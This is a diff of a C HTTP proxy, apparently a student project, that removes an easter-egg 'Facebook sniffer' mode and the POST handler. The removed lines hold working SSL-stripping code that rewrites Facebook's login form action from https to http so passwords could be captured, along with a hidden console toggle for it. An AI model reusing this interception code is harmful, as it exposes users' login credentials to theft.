@@ -32,21 +32,19 @@ void makeGETRequest(char* hostname,
                     char* path,
                     int port,
                     rio_t* proxy_client,
-                    int server_fd,
-                    int hackingmode);
+                    int server_fd);
 //make a POST request to the server
 //currently experimental
 void makePOSTRequest(char* hostname, 
                     char* path,
                     int port,
                     rio_t* proxy_client,
-                    int server_fd,
-                    int hackingmode);
+                    int server_fd);
 //copy the HTTP request from the server to the client
 void copyRequest(int server_fd, rio_t* proxy_client);
 //read back from the server to the client
 void serveToClient(int connfd, rio_t* server_connection, 
-        char* hostname, char* path, int hackingmode);
+        char* hostname, char* path);
 
 
 
@@ -54,7 +52,7 @@ void serveToClient(int connfd, rio_t* server_connection,
 //take over the connection and print the easter egg console
 void easterEgg(int connfd, rio_t* proxy_client, char path[MAXLINE]);
 //change the host, request, and port based on egg settings
-void handleEasterEgg(char* hostname, char* path, int* port, int* hackingmode);
+void handleEasterEgg(char* hostname, char* path, int* port);
 void fbsniffReadback(int connfd, rio_t* server_connection);
 //this version ignores Accept-Encoding: gzip
 void copyRequestNoGzip(int server_fd, rio_t* proxy_client);
@@ -77,10 +75,6 @@ struct ee_features_t
     int nope;
     //rickroll mode: redirect all youtube watch requests to rick astley
     int rickroll;
-    //facebook sniff mode: silently disable ssl on the facebook login page,
-    //  then store any password that gets sent through the proxy.
-    //...don't be evil.
-    int fbsniff;
 };
 struct ee_features_t ee_config;
 
@@ -106,7 +100,6 @@ int main (int argc, char *argv []){
     //don't lock because it doesn't matter here (no threads)
     ee_config.nope = 0;
     ee_config.rickroll = 0;
-    ee_config.fbsniff = 0;
 
 
     //initialize mutexes
@@ -147,11 +140,7 @@ void handleConnection(int connfd){
 
     //get the first line of the request into the buffer
     rio_readlineb(&proxy_client, buffer, MAXLINE);
-    
-    int getrequest = !strncmp(buffer, "GET", 3);
-    int postrequest = !strncmp(buffer, "POST", 4);
-
-    if(getrequest)
+    if(strncmp(buffer, "GET ", 4) == 0)
     {
         //we've got a get request
         debug_printf("Executing a GET request\n");
@@ -162,19 +151,18 @@ void handleConnection(int connfd){
         int port=80;
         parseURL(buffer, hostname, path, &port);
 
-        //if we're trying to access the easter egg console,
-        //  then call the easter egg handler and end the function
-        if((strcmp(hostname, "proxy-configurator.tk") == 0))
-        {
-            //this is some fun easter-egg-ing that we can do
-            easterEgg(connfd, &proxy_client, path);
-            //and done
-            return;
-        }
+        ////if we're trying to access the easter egg console,
+        ////  then call the easter egg handler and end the function
+        //if((strcmp(hostname, "proxy-configurator.tk") == 0))
+        //{
+        //    //this is some fun easter-egg-ing that we can do
+        //    easterEgg(connfd, &proxy_client, path);
+        //    //and done
+        //    return;
+        //}
 
-        //do silly things based on the status of easter eggs
-        int hackingmode=0;
-        handleEasterEgg(hostname, path, &port, &hackingmode);
+        ////do silly things based on the status of easter eggs
+        //handleEasterEgg(hostname, path, &port);
 
         
         //some debug statements
@@ -189,66 +177,17 @@ void handleConnection(int connfd){
 
         //now, make the GET request to the server
         makeGETRequest(hostname, path, port,
-                       &proxy_client, server_fd, hackingmode);
+                       &proxy_client, server_fd);
 
 
         //now read from the server back to the client
-        serveToClient(connfd, &server_connection, hostname, path, hackingmode);
+        serveToClient(connfd, &server_connection, hostname, path);
 
         //clean up
         close(server_fd);
-    	close(connfd);
         debug_printf("Closed connection to %s%s\n", hostname, path);
     }
-    else if(postrequest)
-    {
-        //we've got a get request
-        debug_printf("Executing a POST request\n");
-
-        //parse the URL (hostname, path, and port) from the first line
-        char hostname[MAXLINE];
-        char path[MAXLINE];
-        int port=80;
-        parseURL(buffer, hostname, path, &port);
-
-        //if we're trying to access the easter egg console,
-        //  then call the easter egg handler and end the function
-        if((strcmp(hostname, "proxy-configurator.tk") == 0))
-        {
-            //this is some fun easter-egg-ing that we can do
-            easterEgg(connfd, &proxy_client, path);
-            //and done
-            return;
-        }
-
-        //do silly things based on the status of easter eggs
-        int hackingmode=0;
-        handleEasterEgg(hostname, path, &port, &hackingmode);
-
-        
-        //some debug statements
-        debug_printf("Trying to contact hostname %s on port %d\n",
-                      hostname, port);
-        debug_printf("I'll ask him for the path '%s'\n", path);
-
-
-        //open the connection to the remote server
-        server_fd = open_clientfd(hostname, port);
-        rio_readinitb(&server_connection, server_fd);
-
-        //now, make the POST request to the server
-        makePOSTRequest(hostname, path, port,
-                       &proxy_client, server_fd, hackingmode);
-
-
-        //now read from the server back to the client
-        serveToClient(connfd, &server_connection, hostname, path, hackingmode);
-
-        //clean up
-        close(server_fd);
-		close(connfd);
-        debug_printf("Closed connection\n");
-    }
+    close(connfd);
 }
 
 //parse a URL and set the hostname and path into the given buffers
@@ -300,8 +239,7 @@ void makeGETRequest(char* hostname,
                     char* path,
                     int port, 
                     rio_t* proxy_client,
-                    int server_fd,
-                    int hackingmode)
+                    int server_fd)
 {
     //make the GET request
     rio_writen(server_fd, "GET ", strlen("GET "));
@@ -313,62 +251,14 @@ void makeGETRequest(char* hostname,
     verbose_printf("->\t%s%s HTTP/1.0 \r\n", "GET ", path);
 
 
-    if(hackingmode
-       && (strncmp(hostname, "www.facebook.com", 16) == 0)
-       && (strncmp(path, "/", 1) == 0))
-    {
-        copyRequestNoGzip(server_fd, proxy_client);
-    }
-    else
-    {
-        copyRequest(server_fd, proxy_client);
-    }
+    copyRequest(server_fd, proxy_client);
+    //
     //finish the request
     rio_writen(server_fd, "\r\n", strlen("\r\n"));
 }
 
-//EXPERIMENTAL POST request maker
-void makePOSTRequest(char* hostname, 
-                    char* path,
-                    int port,
-                    rio_t* proxy_client,
-                    int server_fd,
-                    int hackingmode)
-{
-    //make the GET request
-    rio_writen(server_fd, "POST ", strlen("GET "));
-    rio_writen(server_fd, path, strlen(path));
-    rio_writen(server_fd, " ", strlen(" "));
-    rio_writen(server_fd, "HTTP/1.0", strlen("HTTP/1.0"));
-    rio_writen(server_fd, "\r\n", strlen("\r\n"));
-
-    verbose_printf("->\t%s%s HTTP/1.0 \r\n", "POST ", path);
-
-
-    if(hackingmode
-       && (strncmp(hostname, "www.facebook.com", 16) == 0)
-       && (strncmp(path, "/", 1) == 0))
-    {
-        copyRequestNoGzip(server_fd, proxy_client);
-    }
-    else
-    {
-        copyRequest(server_fd, proxy_client);
-    }
-
-    //finish the headers
-    rio_writen(server_fd, "\r\n", strlen("\r\n"));
-
-
-    //we're going to assume that there is only one line of data, limited
-    //implementation...
-    char buffer[MAXLINE];
-    rio_readlineb(proxy_client, buffer, MAXLINE);
-    rio_writen(server_fd, buffer, strlen(buffer));
-}
-
 void serveToClient(int connfd, rio_t* server_connection, 
-        char* hostname, char* path, int hackingmode)
+        char* hostname, char* path)
 {
     char buffer[MAXLINE];
     while(rio_readlineb(server_connection, buffer, MAXLINE) != 0 && 
@@ -379,40 +269,32 @@ void serveToClient(int connfd, rio_t* server_connection,
     }
     rio_writen(connfd, "\r\n", strlen("\r\n"));
     
-    if(hackingmode && (strncmp(hostname, "www.facebook.com", 16) == 0)
-       && (strncmp(path, "/", 1) == 0))
+    //@TODO: cache this
+
+    /****************
+          ____  _____ _____  ____  __ _____ 
+         / __ \|  ___|_ _\ \/ /  \/  | ____|
+        / / _` | |_   | | \  /| |\/| |  _|  
+       | | (_| |  _|  | | /  \| |  | | |___ 
+        \ \__,_|_|   |___/_/\_\_|  |_|_____|
+         \____/   This is the root of the proxy's slowness.
+         Figure out what's wrong with these reads (it goes through one
+         iteration of the loop, then hangs until the connection times out,
+         then does another iteration), and the proxy will work just fine.
+   ************/
+
+
+    ssize_t n = 0; //number of bytes
+    while((n=rio_readnb(server_connection, buffer, MAXLINE)) != 0)
     {
-        fbsniffReadback(connfd, server_connection);
-    }
-    else
-    {
-        //@TODO: cache this
-
-        /****************
-              ____  _____ _____  ____  __ _____ 
-             / __ \|  ___|_ _\ \/ /  \/  | ____|
-            / / _` | |_   | | \  /| |\/| |  _|  
-           | | (_| |  _|  | | /  \| |  | | |___ 
-            \ \__,_|_|   |___/_/\_\_|  |_|_____|
-             \____/   This is the root of the proxy's slowness.
-             Figure out what's wrong with these reads (it goes through one
-             iteration of the loop, then hangs until the connection times out,
-             then does another iteration), and the proxy will work just fine.
-       ************/
-
-
-        ssize_t n = 0; //number of bytes
-        while((n=rio_readnb(server_connection, buffer, MAXLINE)) != 0)
+        if(rio_writen(connfd, buffer, n) == -1)
         {
-            if(rio_writen(connfd, buffer, n) == -1)
-            {
-                printf("Error writing from %s%s\n", hostname, path);
-                //error on write
-                break;
-            }
-            verbose_printf("<-\t%s", buffer);
-            memset(buffer, '\0', MAXLINE*sizeof(char));
+            printf("Error writing from %s%s\n", hostname, path);
+            //error on write
+            break;
         }
+        verbose_printf("<-\t%s", buffer);
+        memset(buffer, '\0', MAXLINE*sizeof(char));
     }
 }
 
@@ -421,7 +303,7 @@ void serveToClient(int connfd, rio_t* server_connection,
  ** Easter Egg functions
  ** Not related to the core functionality of the proxy
  *************/
-void handleEasterEgg(char* hostname, char* path, int* port, int* hackingmode)
+void handleEasterEgg(char* hostname, char* path, int* port)
 {
     //@TODO: reader/writer lock on easteregg
     struct ee_features_t features;
@@ -447,39 +329,7 @@ void handleEasterEgg(char* hostname, char* path, int* port, int* hackingmode)
             sprintf(path, "/watch?v=oHg5SJYRHA0\0");
         }
     }
-    *hackingmode = features.fbsniff;
 }
-void fbsniffReadback(int connfd, rio_t* server_connection)
-{
-    char buffer[MAXLINE];
-    ssize_t n = 0; //number of bytes
-    int replaced = 0;
-    while((n=rio_readnb(server_connection, buffer, MAXLINE)) > 0)
-    {
-        int i=0;
-        while(i<n && !replaced)
-        {
-            if(strncmp(buffer+i*sizeof(char),
-               "action=\"https://www.facebook.com/login.php?login_attempt=1\"",
-               57) == 0)
-            {
-              sprintf(buffer+i*sizeof(char),
-               " action=\"http://www.facebook.com/login.php?login_attempt=1\"");
-              replaced=1;
-              printf("Replaced facebook login\n");
-            }
-            i++;
-        }
-        if(rio_writen(connfd, buffer, n) == -1)
-        {
-            //error on write
-            break;
-        }
-        verbose_printf("<-\t%s", buffer);
-        memset(buffer, '\0', MAXLINE*sizeof(char));
-    }
-}
-
 void easterEgg(int connfd, rio_t* proxy_client, char path[MAXLINE])
 {
     //first, get all the headers in the client's request.
@@ -542,32 +392,6 @@ void easterEgg(int connfd, rio_t* proxy_client, char path[MAXLINE])
                           "Location: /\r\n\r\n";
         rio_writen(connfd, header, strlen(header));
     }
-    else if(strncmp(path, "/set/fbsniff", 7)==0)
-    {
-        printf("Setting facebook sniffer\n");
-        //set fbsniff
-        pthread_mutex_lock(&easteregg_mutex);
-        ee_config.fbsniff = 1;
-        pthread_mutex_unlock(&easteregg_mutex);
-
-        //and return to the status page
-        char header[] = "HTTP/1.0 302 Found\r\n"
-                          "Location: /\r\n\r\n";
-        rio_writen(connfd, header, strlen(header));
-    }
-    else if(strncmp(path, "/set/nofbsniff", 8)==0)
-    {
-        printf("Unsetting facebook sniffer\n");
-        //set fbsniff
-        pthread_mutex_lock(&easteregg_mutex);
-        ee_config.fbsniff = 0;
-        pthread_mutex_unlock(&easteregg_mutex);
-
-        //and return to the status page
-        char header[] = "HTTP/1.0 302 Found\r\n"
-                          "Location: /\r\n\r\n";
-        rio_writen(connfd, header, strlen(header));
-    }
     //other conditions here
     else
     {
@@ -590,11 +414,9 @@ void easterEgg(int connfd, rio_t* proxy_client, char path[MAXLINE])
                                 "<table style='border-left: 1px black solid' >"
                                 "<tr><td>NOPE Mode:</td><td>%s</td></tr>"
                                 "<tr><td>Rickroll:</td><td>%s</td></tr>"
-                                "<tr><td>Facebook Sniffer:</td><td>%s</td></tr>"
                                 "</table>",
                                 (ee_config.nope)?"on":"off",
-                                (ee_config.rickroll)?"on":"off",
-                                (ee_config.fbsniff)?"on":"off");
+                                (ee_config.rickroll)?"on":"off");
 
         pthread_mutex_unlock(&easteregg_mutex);
         rio_writen(connfd, dynamiccontent, strlen(dynamiccontent));
@@ -632,15 +454,6 @@ void easterEgg(int connfd, rio_t* proxy_client, char path[MAXLINE])
                          "  </a></td>"
                          "</tr>"
                          "<tr>"
-                         "  <td><a onclick='"
-                         "return confirm(\"This feature exists to show off"
-                         " Coding ability. Promise not to be evil??\")' "
-                         "       href=\"/set/fbsniff\"'>"
-                         "      Engage Facebook Sniffer"
-                         "  </a></td>"
-                         "  <td><a href='/set/nofbsniff'>"
-                         "      Disengage Facebook Sniffer"
-                         "  </a></td>"
                          "</tr>"
                          "</table>";
         rio_writen(connfd, options, strlen(options));
@@ -651,19 +464,4 @@ void easterEgg(int connfd, rio_t* proxy_client, char path[MAXLINE])
     }
 
     close(connfd);
-}
-
-//the same as copyRequest, but ignores Accept-Encoding header
-void copyRequestNoGzip(int server_fd, rio_t* proxy_client)
-{
-    char buffer[MAXLINE];
-    while(rio_readlineb(proxy_client, buffer, MAXLINE) && 
-            strncmp(buffer, "\r", 1))
-    {
-        if(strncmp(buffer, "Accept-Encoding:", 16))
-        {
-            rio_writen(server_fd, buffer, strlen(buffer));
-            verbose_printf("->\t%s", buffer);
-        }
-    }
 }
